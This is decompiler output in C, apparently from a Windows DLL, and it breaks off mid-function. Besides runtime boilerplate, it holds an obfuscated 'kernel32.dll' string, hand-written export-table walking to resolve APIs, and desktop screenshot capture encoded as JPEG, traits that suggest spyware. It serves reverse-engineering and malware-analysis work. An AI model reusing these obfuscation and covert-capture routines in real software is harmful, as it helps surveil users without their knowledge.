//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int128_t;

// ----------------- Float Types Definitions ------------------

typedef long double float80_t;

// ------------------------ Structures ------------------------

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _LUID {
    int32_t e0;
    int32_t e1;
};

struct _LUID_AND_ATTRIBUTES {
    struct _LUID e0;
    int32_t e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OSVERSIONINFOW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int16_t e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _PROCESS_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOW {
    int32_t e0;
    int16_t * e1;
    int16_t * e2;
    int16_t * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

struct _TOKEN_PRIVILEGES {
    int32_t e0;
    struct _LUID_AND_ATTRIBUTES e1[1];
};

struct _WIN32_FIND_DATAA {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    char e8[1];
    char e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct __MIDL___MIDL_itf_mfobjects_0000_0008_0001 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int16_t e3;
    int16_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
};

struct __MIDL___MIDL_itf_mfobjects_0000_0008_0002 {
    struct __MIDL___MIDL_itf_mfobjects_0000_0008_0001 e0;
    int32_t e1[1];
};

struct addrinfo {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    char * e5;
    struct sockaddr * e6;
    struct addrinfo * e7;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

struct tagRECT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct tagWNDCLASSW {
    int32_t e0;
    int32_t (*e1)(int32_t *, int32_t, int32_t, int32_t);
    int32_t e2;
    int32_t e3;
    int32_t * e4;
    int32_t * e5;
    int32_t * e6;
    int32_t * e7;
    int16_t * e8;
    int16_t * e9;
};

struct vtable_1001a0ec_type {
    int32_t (*e0)(int32_t);
    int32_t (*e1)();
};

struct vtable_1001ee98_type {
    int32_t (*e0)(char);
    int32_t (*e1)();
};

// ------------------------- Classes --------------------------

// .?AVBitmap@Gdiplus@@ (base classes: .?AVGdiplusBase@Gdiplus@@, .?AVImage@Gdiplus@@)
// .?AVGdiplusBase@Gdiplus@@
// .?AVImage@Gdiplus@@
// .?AV_Generic_error_category@std@@
// .?AV_Iostream_error_category@std@@ (base classes: .?AV_Generic_error_category@std@@, .?AVerror_category@std@@)
// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVerror_category@std@@
// .?AVexception@std@@
// .?AVlogic_error@std@@ (base classes: .?AVexception@std@@)
// .?AVout_of_range@std@@ (base classes: .?AVexception@std@@, .?AVlogic_error@std@@)

// ------------------- Function Prototypes --------------------

int32_t _3f__3f_1_3f__24__AnonymousOriginator_40_I_40_details_40_Concurrency_40__40_UAE_40_XZ(void);
int32_t _3f__3f_1ThreadProxy_40_details_40_Concurrency_40__40_UAE_40_XZ(void);
void _3f__3f_3_40_YAXPAX_40_Z(int32_t * a1);
void _3f__CallMemberFunction0_40__40_YGXPAX0_40_Z(int32_t * result, int32_t * a2, int32_t * a3);
int32_t _3f__ValidateExecute_40__40_YAHP6GHXZ_40_Z(int32_t (*a1)());
int32_t _40___security_check_cookie_40_4(void);
int32_t ___crtSleep(int32_t dwMilliseconds);
int32_t * ___get_sigabrt(int32_t * Ptr);
int32_t ___iob_func(void);
int32_t __cexit(void);
int32_t __crt_debugger_hook(void);
int32_t __fast_exit(int32_t a1);
int32_t __flushall(void);
int32_t __heap_term(void);
int32_t * __initp_eh_hooks(int32_t * Ptr);
int32_t __initp_heap_handler(int32_t result);
int32_t __initp_misc_invarg(int32_t result);
int32_t __initp_misc_purevirt(int32_t result);
int32_t __initp_misc_rand_s(int32_t result);
int32_t __lockexit(void);
int32_t __matherr(void);
int32_t __NLG_Call(void);
int32_t __NLG_Notify1(void);
int32_t __unlockexit(void);
int32_t _DllMain_40_12(void);
bool _IsProcessorFeaturePresent_40_4(int32_t ProcessorFeature);
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue);
int32_t function_10001000(void (*func)());
int32_t function_10001010(void (*func)());
int32_t function_10001020(void (*func)());
int32_t function_10001030(void (*func)());
int32_t function_10001040(char a1);
int32_t function_10001070(void);
int32_t function_100010c0(char a1);
int32_t function_100010f0(int32_t result, int32_t a2);
int32_t function_10001110(int32_t a1, int32_t a2);
int32_t function_10001150(int32_t a1, int32_t a2);
int32_t function_10001170(void);
int32_t function_10001180(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_100011f0(void);
int32_t function_10001200(int32_t result, int32_t a2);
int32_t function_10001250(void);
int32_t function_10001260(int32_t result, int32_t a2);
int32_t function_100012d0(int32_t result, int32_t a2);
int32_t function_10001310(int32_t a1, int32_t * a2);
int32_t function_10001530(void);
int32_t function_100017a0(void);
int32_t function_10001810(void);
int32_t function_10001a30(void);
int32_t function_10002050(void);
int32_t function_10002170(void);
int32_t function_10002560(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_10002690(uint32_t a1, int32_t a2);
int32_t function_10002830(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_10002980(int32_t a1);
int32_t function_10002990(int32_t a1);
int32_t function_100029d0(int32_t * a1);
int32_t function_10002a30(int32_t a1);
int32_t function_10002a90(int32_t a1);
int32_t function_10002d90(int32_t a1, int32_t a2, int32_t lpBuffer);
int32_t function_10003050(int32_t a1, int32_t a2, int32_t a3);
int32_t function_100030a0(void);
int32_t function_10003140(void);
int32_t function_100032e0(void);
int32_t function_100034f0(void);
int32_t function_100035d0(void);
int32_t function_10003640(void);
int32_t function_100038a0(void);
int32_t function_10003b00(int32_t hWnd, uint32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_10003b50(void);
int32_t function_10003cc0(void);
int32_t function_10003d20(int32_t a1, int32_t a2);
int32_t function_10004a60(int32_t a1);
int32_t function_10004d80(void);
int32_t function_10004ed0(int32_t a1, int32_t a2);
int32_t function_100058f0(void);
int32_t function_10005930(void);
int32_t function_10005b30(void);
int32_t function_10005be0(void);
int32_t function_10006530(void);
int32_t function_10006ad0(int32_t a1);
int32_t function_10007210(int32_t a1, char * a2);
int32_t function_100072b0(int32_t a1, int32_t a2);
int32_t function_100075f0(void);
int32_t function_10007730(int32_t a1, int32_t a2);
int32_t function_10007880(int32_t uBytes, int32_t a2, char a3, int32_t a4);
int32_t function_10008420(void);
int32_t function_100084b0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10008c80(int32_t a1);
int32_t function_10008d20(int32_t a1, int32_t a2);
int32_t function_10009460(void);
int32_t function_100096c0(void);
int32_t function_10009970(int32_t lpString2, int32_t a2);
int32_t function_10009ad0(void);
int32_t function_10009b20(int32_t lpString2, int32_t a2, int32_t a3);
int32_t function_10009da0(int32_t a1, uint32_t a2);
int32_t function_10009ea0(int32_t a1);
int32_t function_1000a2b0(void);
int32_t function_1000a690(int32_t a1);
int32_t function_1000a8b1(void);
int32_t function_1000a8bc(void);
int32_t function_1000b1da(void);
int32_t function_1000b43d(void);
int32_t function_1000b6e2(void);
int32_t function_1000b779(int32_t a1);
int32_t function_1000b93a(void);
int32_t function_1000b949(void);
int32_t function_1000be15(void);
int32_t function_1000bf0a(void);
int32_t function_1000bf1d(void);
int32_t function_1000c0f0(int32_t result3, int32_t a2, uint32_t a3);
int32_t function_1000c92c(void);
int32_t function_1000c92f(int32_t a1);
int32_t function_1000cb1b(int32_t a1);
int32_t function_1000cde7(void);
int32_t function_1000d684(void);
int32_t function_1000d690(void);
int32_t function_1000d7f7(void);
int32_t function_1000d800(void);
int32_t function_1000dced(int32_t a1, int32_t a2);
int32_t function_1000e7cb(void);
int32_t function_1000e924(void);
int32_t function_1000ed0a(void);
int32_t function_1000ed17(void);
int32_t function_1000ed1b(int32_t a1);
int32_t function_1000f0df(void);
int32_t function_1000f25a(void);
int32_t function_1000f263(void);
int32_t function_10010613(void);
int32_t function_100106fb(void);
int32_t function_10010c9e(void);
int32_t function_10011232(void);
int32_t function_100112f7(int32_t * a1);
int32_t function_10011301(void);
int32_t function_10011388(void);
int32_t function_100113a9(void);
int32_t function_10011a6b(void);
int32_t function_10011b17(void);
int32_t function_10011df3(void);
int32_t function_10012fe6(int32_t a1);
int32_t function_100132b3(void);
int32_t function_100132bd(void);
float80_t function_100132c4(void);
float80_t function_100132cb(void);
float80_t function_100132d2(void);
float80_t function_100132fd(void);
float80_t function_10013327(void);
int32_t function_10013379(void);
int32_t function_10013383(void);
float80_t function_100133f0(void);
int32_t function_100134c5(void);
int32_t function_10013610(void);
int32_t function_10013617(int32_t a1);
int32_t function_10013b6e(void);
int32_t function_10013ba1(void);
int32_t function_10013c71(void);
int32_t function_100145d0(void);
int32_t function_10014e0c(void);
int32_t function_100157d6(void);
int32_t function_10015a85(void);
int32_t function_10015b2b(void);
int32_t function_10015ea6(void);
int32_t function_1001828a(void);
int32_t function_100185f0(void);
int32_t function_10018650(void);
int32_t function_10018660(void);
int32_t function_10018670(void);
int32_t function_11f047eb(void);
int32_t function_12483423(void);
int32_t JLI_AcceptableRelease(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x100010c0; // 0x1001a07c
int32_t g2 = 0x100010c0; // 0x1001a0d0
int32_t g4 = 0x1000b545; // 0x1001a134
int32_t g5 = 0x1000cd68; // 0x1001a18c
int32_t g6 = 0x1001123d; // 0x1001b4f0
int32_t g7 = 0; // 0x1001e75c
int16_t * g8 = (int16_t *)87; // 0x1001e7d8
int16_t * g9 = (int16_t *)80; // 0x1001e7dc
int32_t g10 = 63; // 0x1001e8b0
int32_t g11 = 38; // 0x1001e8b4
int32_t g12 = 61; // 0x1001e8b8
int16_t * g13 = (int16_t *)34; // 0x1001e9f8
int32_t g14 = 61; // 0x1001eb0c
char * g15 = "MWuFQPJLM\x7fqVM"; // 0x1001eccc
int32_t g16 = 92; // 0x1001ece4
int32_t g17 = 92; // 0x1001ece8
int32_t g18 = 92; // 0x1001ed1c
int32_t g19 = 48; // 0x1001ed20
int32_t g20 = 92; // 0x1001ed2c
int32_t g22 = 0x10001040; // 0x1001eea4
int128_t g23; // 0x1001ef40
int128_t g24; // 0x1001ef50
int128_t g25; // 0x1001ef60
int128_t g26; // 0x1001ef70
int128_t g27; // 0x1001ef80
int128_t g28; // 0x1001ef90
int128_t g29; // 0x1001efa0
int128_t g30; // 0x1001efc0
int128_t g31; // 0x1001efd0
int128_t g32; // 0x1001efe0
int128_t g33; // 0x1001eff0
int128_t g34; // 0x1001f000
int128_t g35; // 0x1001f010
int128_t g36; // 0x1001f020
int128_t g37; // 0x1001f030
int128_t g38; // 0x1001f040
int128_t g39; // 0x1001f050
int128_t g40; // 0x1001f060
int128_t g41; // 0x1001f070
int128_t g42; // 0x1001f080
int128_t g43; // 0x1001f090
int128_t g44; // 0x1001f0a0
int128_t g45; // 0x1001f0b0
int128_t g46; // 0x1001f0c0
int128_t g47; // 0x1001f0d0
int128_t g48; // 0x1001f0e0
int128_t g49; // 0x1001f0f0
int128_t g50; // 0x1001f100
int128_t g51; // 0x1001f110
int128_t g52; // 0x1001f120
int128_t g53; // 0x1001f130
int128_t g54; // 0x1001f140
int128_t g55; // 0x1001f150
int128_t g56; // 0x1001f160
int128_t g57; // 0x1001f170
int128_t g58; // 0x1001f180
int128_t g59; // 0x1001f190
int128_t g60; // 0x1001f1a0
int128_t g61; // 0x1001f1b0
int128_t g62; // 0x1001f1c0
int128_t g63; // 0x1001f1d0
int128_t g64; // 0x1001f1e0
int128_t g65; // 0x1001f1f0
int32_t g66 = -0x44bf19b2; // 0x10021008
int32_t g67 = 1; // 0x10021010
int32_t g68 = -1; // 0x10021190
int32_t g70 = 0xfeff; // 0x100221f0
int32_t g71 = -1; // 0x100221f4
char g72[13] = "lfsofm43/emm"; // 0x10022208
char g73[9] = "fm43/emm"; // 0x1002220c
char g74[5] = "/emm"; // 0x10022210
int32_t g75 = 0; // 0x10022214
int64_t g76 = 0x32ce8ef; // 0x10022218
int32_t g77 = 0; // 0x10022238
int32_t g78 = 0; // 0x10022248
int32_t g79 = 15; // 0x1002224c
int32_t g81; // 0x10022254
int32_t g82 = 0; // 0x100227ac
int32_t g83 = 0; // 0x100227b4
int32_t g84 = 0; // 0x100227b8
int32_t g85 = 0; // 0x100227bc
int32_t g86 = 0; // 0x10022df8
int32_t g87 = 0; // 0x10022dfc
int32_t g88 = 0; // 0x10022f58
int32_t g89 = 0; // 0x10022f70
int16_t * g90 = NULL; // 0x10023210
int16_t * g91 = NULL; // 0x10023418
int32_t g92 = 0; // 0x1002341a
int32_t g93 = 0; // 0x10023c18
int32_t g94 = 0; // 0x10023c1c
char * g95; // 0x10023c20
int32_t g96 = 0; // 0x10023c24
int32_t g97 = 0; // 0x10023c28
int32_t g98 = 0; // 0x10023c2a
int32_t g99 = 0; // 0x10023c30
int32_t g100 = 0; // 0x10023c34
int32_t g101 = 0; // 0x10023c38
int32_t g102 = 0; // 0x10023ce8
int16_t g103 = 0; // 0x10023cec
int16_t g104 = 0; // 0x10023cee
int16_t g105 = 0; // 0x10023cf2
int16_t g106 = 0; // 0x10023cf4
int16_t g107 = 0; // 0x10023cf6
int16_t g108 = 0; // 0x10023cf8
int32_t g109 = 0; // 0x10023cfc
int16_t * g110 = NULL; // 0x10023d00
int32_t g111 = 0; // 0x10024500
int32_t g112 = 0; // 0x10024504
int32_t g113 = 0; // 0x10024508
int32_t g114 = 0; // 0x1002450c
int16_t * g115 = NULL; // 0x10024510
int32_t g116 = 0; // 0x10024e38
int32_t g117 = 0; // 0x10024e3c
int32_t ** g118 = NULL; // 0x10024e40
int32_t g119 = 0; // 0x10024e44
int16_t * g120 = NULL; // 0x10024e48
int32_t g121 = 0; // 0x10024e4c
int32_t g122 = 0; // 0x10024e50
int32_t g123 = 0; // 0x10024e54
int32_t g124 = 0; // 0x10024e74
int32_t g125 = 0; // 0x10024e78
int32_t g126 = 0; // 0x10024e7c
int32_t g127 = 0; // 0x10024e80
int32_t g128 = 0; // 0x10024e84
int32_t g129 = 0; // 0x10024e88
int32_t g130 = 0; // 0x10024e8c
int32_t g131 = 0; // 0x10024e90
int16_t * g132 = NULL; // 0x10024e94
int32_t g133 = 0; // 0x10024e98
int32_t g134 = 0; // 0x10024e9c
int32_t g135 = 0; // 0x10024ea0
int32_t g136 = 0; // 0x10024ea4
int32_t g137 = 0; // 0x10024ebc
int32_t g138 = 0; // 0x10024ec0
int32_t g139 = 0; // 0x10024ec4
int32_t g140 = 0; // 0x10024ec8
int32_t g141 = 0; // 0x10024ecc
int32_t g142 = 0; // 0x10024ed0
int32_t g143 = 0; // 0x10024ed4
int32_t g144 = 0; // 0x10024ed8
int32_t g145 = 0; // 0x10024edc
int32_t g146 = 0; // 0x10024ee0
int32_t g147 = 0; // 0x10024f0c
int32_t g148 = 0; // 0x10024f10
int32_t g149 = 0; // 0x10024f14
int32_t g150 = 0; // 0x10024f18
int32_t g151 = 0; // 0x10024f60
int32_t g152 = 0; // 0x10025f60
int32_t g153 = 0; // 0x10026004
int32_t g154;
int32_t g155;
int32_t g156;
int32_t g157;
int32_t g158;
int32_t g159;
int32_t g160;
int32_t g161;
struct vtable_1001a0ec_type g3 = {
    .e0 = _3f__3f__GFreeThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z,
    .e1 = function_1000cde7
}; // 0x1001a0ec
struct vtable_1001ee98_type g21 = {
    .e0 = function_10001040,
    .e1 = function_10001070
}; // 0x1001ee98
int32_t * g69 = &g151; // 0x10021b88
int32_t * g80 = &g2; // 0x10022250

// ------------------------ Functions -------------------------

// Address range: 0x10001000 - 0x1000100c
int32_t function_10001000(void (*func)()) {
    // 0x10001000
    return _atexit(func);
}

// Address range: 0x10001010 - 0x1000101c
int32_t function_10001010(void (*func)()) {
    // 0x10001010
    return _atexit(func);
}

// Address range: 0x10001020 - 0x1000102c
int32_t function_10001020(void (*func)()) {
    // 0x10001020
    return _atexit(func);
}

// Address range: 0x10001030 - 0x1000103c
int32_t function_10001030(void (*func)()) {
    // 0x10001030
    return _atexit(func);
}

// Address range: 0x10001040 - 0x10001069
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_10001040(char a1) {
    // 0x10001040
    int32_t result; // 0x10001040
    int32_t * v1 = (int32_t *)result; // 0x10001049
    *v1 = (int32_t)&g22;
    GdipDisposeImage((int32_t *)*(int32_t *)(result + 4));
    if ((a1 & 1) != 0) {
        // 0x1000105b
        GdipFree(v1);
    }
    // 0x10001062
    return result;
}

// Address range: 0x10001070 - 0x100010bc
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_10001070(void) {
    int32_t v1 = 0; // bp-8, 0x10001077
    int32_t v2; // 0x10001070
    int32_t v3 = GdipCloneImage((int32_t *)*(int32_t *)(v2 + 4), (int32_t **)&v1); // 0x10001085
    if (v3 != 0) {
        // 0x1000108f
        *(int32_t *)(v2 + 8) = v3;
    }
    int32_t * v4 = GdipAlloc(16); // 0x10001094
    if (v4 == NULL) {
        // 0x100010b5
        return 0;
    }
    int32_t result = (int32_t)v4; // 0x10001094
    *v4 = (int32_t)&g22;
    *(int32_t *)(result + 4) = v1;
    *(int32_t *)(result + 8) = *(int32_t *)(v2 + 8);
    return result;
}

// Address range: 0x100010c0 - 0x100010e2
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_100010c0(char a1) {
    // 0x100010c0
    int32_t result; // 0x100010c0
    int32_t * v1 = (int32_t *)result; // 0x100010ca
    *v1 = (int32_t)&g1;
    if ((a1 & 1) != 0) {
        // 0x100010d2
        _free(v1);
    }
    // 0x100010db
    return result;
}

// Address range: 0x100010f0 - 0x10001102
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_100010f0(int32_t result, int32_t a2) {
    // 0x100010f0
    *(int32_t *)result = a2;
    return result;
}

// Address range: 0x10001110 - 0x10001143
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_10001110(int32_t a1, int32_t a2) {
    // 0x10001110
    int32_t v1; // 0x10001110
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x10001125
    if (v2 != *(int32_t *)(a2 + 4)) {
        // 0x1000113b
        int32_t v3; // 0x10001110
        return v3 & -256;
    }
    // 0x1000112d
    if (v2 != *(int32_t *)a2) {
        // 0x1000113b
        return v2 & -256;
    }
    // 0x10001133
    return v2 & -256 | 1;
}

// Address range: 0x10001150 - 0x1000116e
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_10001150(int32_t a1, int32_t a2) {
    // 0x10001150
    int32_t v1; // 0x10001150
    if (v1 != *(int32_t *)(a1 + 4)) {
        // 0x10001168
        return a1 & -256;
    }
    int32_t v2 = *(int32_t *)a1; // 0x1000115b
    if (v2 != a2) {
        // 0x10001168
        return v2 & -256;
    }
    // 0x10001162
    return v2 & -256 | 1;
}

// Address range: 0x10001170 - 0x10001176
int32_t function_10001170(void) {
    // 0x10001170
    return (int32_t)"generic";
}

// Address range: 0x10001180 - 0x100011f0
int32_t function_10001180(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(a2); // 0x1000118f
    int32_t v2 = v1 != 0 ? v1 : (int32_t)"unknown error"; // 0x100011a1
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    int32_t v3 = v2; // 0x100011b8
    if (*(char *)v2 == 0) {
        // 0x100011ba
        function_10002690(v2, 0);
        return result;
    }
    v3++;
    while (*(char *)v3 != 0) {
        // 0x100011d4
        v3++;
    }
    // 0x100011db
    function_10002690(v2, v3 - v2);
    return result;
}

// Address range: 0x100011f0 - 0x100011f6
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_100011f0(void) {
    // 0x100011f0
    return (int32_t)"iostream";
}

// Address range: 0x10001200 - 0x1000124f
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_10001200(int32_t result, int32_t a2) {
    // 0x10001200
    if (a2 != 1) {
        // 0x1000123f
        int32_t v1; // 0x10001200
        int32_t v2; // 0x10001200
        function_10001180(result, a2, v1, 0, v2);
        return result;
    }
    // 0x10001217
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    function_10002690((int32_t)"iostream stream error", 21);
    return result;
}

// Address range: 0x10001250 - 0x10001256
int32_t function_10001250(void) {
    // 0x10001250
    return (int32_t)"system";
}

// Address range: 0x10001260 - 0x100012d0
int32_t function_10001260(int32_t result, int32_t a2) {
    int32_t v1 = ?_Syserror_map@std@@YAPBDH@Z(a2); // 0x1000126f
    int32_t v2 = v1 != 0 ? v1 : (int32_t)"unknown error"; // 0x10001281
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    int32_t v3 = v2; // 0x10001298
    if (*(char *)v2 == 0) {
        // 0x1000129a
        function_10002690(v2, 0);
        return result;
    }
    v3++;
    while (*(char *)v3 != 0) {
        // 0x100012b4
        v3++;
    }
    // 0x100012bb
    function_10002690(v2, v3 - v2);
    return result;
}

// Address range: 0x100012d0 - 0x10001301
int32_t function_100012d0(int32_t result, int32_t a2) {
    int32_t v1 = _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(a2); // 0x100012d8
    *(int32_t *)result = a2;
    int32_t * v2 = (int32_t *)(result + 4);
    if (v1 == 0) {
        // 0x100012f5
        *v2 = (int32_t)&g80;
        return result;
    }
    // 0x100012e9
    *v2 = 0x10022254;
    return result;
}

// Address range: 0x10001310 - 0x1000152a
int32_t function_10001310(int32_t a1, int32_t * a2) {
    // 0x10001310
    int32_t v1; // bp-207, 0x10001310
    _memset(&v1, 0, 99);
    int32_t v2; // bp-107, 0x10001310
    _memset(&v2, 0, 99);
    int32_t lpModuleName = 0x6e72656b; // bp-208, 0x1000134f
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&lpModuleName); // 0x1000137b
    char v3 = 76; // bp-108, 0x10001383
    int32_t v4 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x100013a6
    int32_t v5 = function_10007210(moduleHandle, &v3); // 0x100013b2
    uint16_t v6 = *(int16_t *)(2 * v5 + moduleHandle + *(int32_t *)(v4 + 36)); // 0x100013c0
    int32_t v7 = *(int32_t *)(v4 + 28); // 0x100013c4
    int32_t v8 = *(int32_t *)(v7 + moduleHandle + 4 * (int32_t)v6) + moduleHandle; // 0x100013d3
    g93 = v8;
    v3 = 76;
    int32_t v9 = *(int32_t *)(v8 + 120 + *(int32_t *)(v8 + 60)); // 0x100013f6
    int32_t v10 = *(int32_t *)(v8 + 24 + v9); // 0x10001404
    int32_t v11 = v10; // 0x10001404
    function_10007210(v8, &v3);
    int32_t v12 = 0; // bp-212, 0x10001426
    int32_t uBytes = 0; // bp-216, 0x10001443
    GdipGetImageEncodersSize(&v12, &uBytes);
    if (uBytes == 0) {
        // 0x1000145e
        return _40___security_check_cookie_40_4();
    }
    int32_t * memoryHandle = LocalAlloc(64, uBytes); // 0x10001475
    if (memoryHandle == NULL) {
        // 0x100014ea
        return _40___security_check_cookie_40_4();
    }
    // 0x10001481
    GdipGetImageEncoders(v12, uBytes, memoryHandle);
    if (v12 == 0) {
        // 0x100014ea
        return _40___security_check_cookie_40_4();
    }
    int32_t v13 = (int32_t)memoryHandle; // 0x10001475
    int32_t v14 = v13 + 48; // 0x1000149e
    int32_t v15 = 0;
    int32_t v16 = *(int32_t *)v14;
    int32_t v17 = (int32_t)L"image/jpeg";
    uint16_t v18 = *(int16_t *)v16; // 0x100014a8
    int32_t v19 = v10 & -0x10000; // 0x100014a8
    int32_t v20 = v19 | (int32_t)v18; // 0x100014a8
    v11 = v20;
    int32_t v21 = v20; // 0x100014ae
    uint16_t v22; // 0x100014b5
    int32_t v23; // 0x100014b5
    while (v18 == *(int16_t *)v17) {
        if (v18 == 0) {
            goto lab_0x100014fe;
        }
        // 0x100014b5
        v22 = *(int16_t *)(v16 + 2);
        v23 = v19 | (int32_t)v22;
        v11 = v23;
        v21 = v23;
        if (v22 != *(int16_t *)(v17 || 2)) {
            // break -> 0x100014d7
            break;
        }
        // 0x100014bf
        if (v22 == 0) {
            // 0x100014fe
            __asm_movdqu(*(int128_t *)&v11, __asm_movdqu_11(*(int128_t *)(76 * v15 + v13)));
            return _40___security_check_cookie_40_4();
        }
        v16 += 4;
        v17 += 4;
        v18 = *(int16_t *)v16;
        v19 = v23 & -0x10000;
        v20 = v19 | (int32_t)v18;
        v11 = v20;
        v21 = v20;
    }
    int32_t v24 = v15 + 1; // 0x100014d7
    v14 += 76;
    while (v24 < v12) {
        // 0x100014a1
        v15 = v24;
        v16 = *(int32_t *)v14;
        v17 = (int32_t)L"image/jpeg";
        v18 = *(int16_t *)v16;
        v19 = v21 & -0x10000;
        v20 = v19 | (int32_t)v18;
        v11 = v20;
        v21 = v20;
        while (v18 == *(int16_t *)v17) {
            if (v18 == 0) {
                goto lab_0x100014fe;
            }
            // 0x100014b5
            v22 = *(int16_t *)(v16 + 2);
            v23 = v19 | (int32_t)v22;
            v11 = v23;
            v21 = v23;
            if (v22 != *(int16_t *)(v17 || 2)) {
                // break -> 0x100014d7
                break;
            }
            // 0x100014bf
            if (v22 == 0) {
                // 0x100014fe
                __asm_movdqu(*(int128_t *)&v11, __asm_movdqu_11(*(int128_t *)(76 * v15 + v13)));
                return _40___security_check_cookie_40_4();
            }
            v16 += 4;
            v17 += 4;
            v18 = *(int16_t *)v16;
            v19 = v23 & -0x10000;
            v20 = v19 | (int32_t)v18;
            v11 = v20;
            v21 = v20;
        }
        // 0x100014d7
        v24 = v15 + 1;
        v14 += 76;
    }
    // 0x100014ea
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10001530 - 0x10001799
int32_t function_10001530(void) {
    int32_t v1 = 20; // bp-156, 0x10001558
    int32_t v2 = 1; // bp-172, 0x10001563
    int32_t v3; // bp-148, 0x10001530
    GdiplusStartup(&v3, &v2, NULL);
    int32_t * hWnd = GetDesktopWindow(); // 0x100015b6
    int32_t lpRect; // bp-24, 0x10001530
    GetWindowRect(hWnd, (struct tagRECT *)&lpRect);
    int32_t * hdc = GetWindowDC(hWnd); // 0x100015ca
    int32_t v4; // 0x10001530
    int32_t cx = v4 - lpRect; // 0x100015d5
    int32_t v5 = cx; // bp-120, 0x100015d8
    GetDeviceCaps(hdc, 12);
